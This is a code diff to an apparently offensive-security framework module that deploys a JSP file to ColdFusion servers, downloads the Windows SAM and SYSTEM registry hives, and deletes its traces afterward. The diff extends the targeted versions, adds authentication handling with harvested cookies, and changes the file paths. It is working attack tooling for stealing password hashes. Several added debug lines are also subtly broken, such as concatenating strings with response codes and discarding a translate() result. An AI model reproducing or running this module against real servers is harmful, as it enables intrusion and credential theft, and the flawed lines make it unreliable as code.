@@ -1,8 +1,8 @@
 from src.platform.coldfusion.interfaces import CINTERFACES
+from src.platform.coldfusion.authenticate import checkAuth
 from log import LOG
 from auxiliary import Auxiliary
 from os import getuid
-from time import sleep
 import deployer
 import utility
 
@@ -13,6 +13,7 @@ class Auxiliary:
         local_filename = fname
         try:
             r = utility.requests_get(url, stream=True)
+            utility.Msg("Attempting to retrieve %s as " + fname % r, LOG.DEBUG)
             with open(local_filename, 'wb') as f:
                 for chunk in r.iter_content(chunk_size=1024):
                     if chunk:
@@ -20,29 +21,32 @@ class Auxiliary:
                         f.flush()
             return local_filename
         except Exception, e:
+            utility.Msg("Reponse code:" + r.code, LOG.DEBUG)
             utility.Msg("Error downloading the " + fname + " file: %s" % e, LOG.ERROR)
 
     def Cleanup(self, fingerengine, fingerprint, sam, sys):
-        #Cover the skid marks on the server
         url = "http://{0}:{1}/CFIDE/getSAM.jsp?del={2}&del2={3}".format(
             fingerengine.options.ip, fingerprint.port, sam, sys)
 
         try:
+            utility.Msg("Attempting delete at " + url, LOG.DEBUG)
             response = utility.requests_get(url)
         except Exception, e:
+            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
             utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
             return
 
         if response.status_code == 200:
             utility.Msg("Files cleaned up from server.", LOG.SUCCESS)
         else:
+            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
             utility.Msg("We might not have cleaned the files up correctly", LOG.ERROR)
 
     def __init__(self):
         self.name = 'Obtain Sam and System Registry hives.'
-        self.versions = ['9.0']
+        self.versions = ["6.0", "7.0", "8.0", "9.0"]
         self.show = True
-        self.flag = 'cf-getSAM'
+        self.flag = 'cf-sam'
 
     def check(self, fingerprint):
         if fingerprint.title == CINTERFACES.CFM and \
@@ -52,12 +56,14 @@ class Auxiliary:
 
     def run(self, fingerengine, fingerprint):
         if getuid() > 0:
-            utility.Msg("Root prives required for this module.", LOG.ERROR)
+            utility.Msg("Root privs required for this module.", LOG.ERROR)
             return
 
         fingerengine.options.deploy = "./src/lib/getSAM.jsp"
         deployer.run(fingerengine)
 
+        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
+        uri = "/CFIDE/administrator/reports/index.cfm"
         url = "http://{0}:{1}/CFIDE/getSAM.jsp".format(
             fingerengine.options.ip, fingerprint.port)
 
@@ -66,40 +72,53 @@ class Auxiliary:
         try:
             response = utility.requests_get(url)
         except Exception, e:
+            utility.Msg("Reponse code:" + response.code + " for " + url, LOG.DEBUG)
             utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
             return
 
-        if response.status_code == 401:
-            utility.Msg("Host requires auth...")
+        #Might not keep this check here....
+        if response.status_code == 200 and "ColdFusion Administrator Login" \
+                                 in response.content:
+
+            utility.Msg("Host %s:%s requires auth, checking..." %
+                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
+            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
+                                fingerprint.title, fingerprint.version)
+
+            if cookies:
+                response = utility.requests_get(base + uri, cookies=cookies[0])
+            else:
+                utility.Msg("Could not get auth for %s:%s" %
+                               (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
+                return
 
         if response.status_code == 200:
-            utility.Msg("Deploy worked. Getting the files...")
+            utility.Msg("Deploy worked. Getting the files...", LOG.DEBUG)
             filenames = response.text
             if len(filenames) != 0:
                 samfile = filenames.split("<")[0]
-                samfile = samfile.replace(" ", "")
-                samfile = samfile.replace("\n", "")
+                samfile = samfile.translate(None, ' \n')
                 samfile = samfile.rstrip()
                 systemf = filenames.split(">")[1]
-                systemf = systemf.replace("\n", "")
-                systemf = systemf.replace(" ", "")
+                systemf.translate(None,' \n')
                 systemf = systemf.rstrip()
 
-                utility.Msg("Data in response, snagging hashes.", LOG.SUCCESS)
+                utility.Msg("Data in response, attempting to retrieve hashes.", LOG.DEBUG)
 
-                urlsam = "http://{0}:{1}/CFIDE/{2}".format(
+                urlsam = "http://{0}:{1}/getSAM/{2}".format(
                                         fingerengine.options.ip, fingerprint.port, samfile)
                 self.download_file(urlsam, "SAM")
-                utility.Msg("Downloaded SAM into clustered directory.")
 
-                urlsys = "http://{0}:{1}/CFIDE/{2}".format(
+                urlsys = "http://{0}:{1}/getSAM/{2}".format(
                                         fingerengine.options.ip, fingerprint.port, systemf)
                 self.download_file(urlsys, "System")
-                utility.Msg("Downloaded System into clusterd directory.")
+                utility.Msg("Downloaded SYSTEM/SAM to local directory.", LOG.SUCCESS)
 
                 self.Cleanup(fingerengine, fingerprint, samfile, systemf)
 
-        if response.status_code == 404:
+        else:
+            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
+            #utility.Msg("Response data:\n" + response.text, LOG.DEBUG)
             utility.Msg("Seems the module didn't deploy correctly...", LOG.ERROR)
 
         fingerengine.options.deploy = None
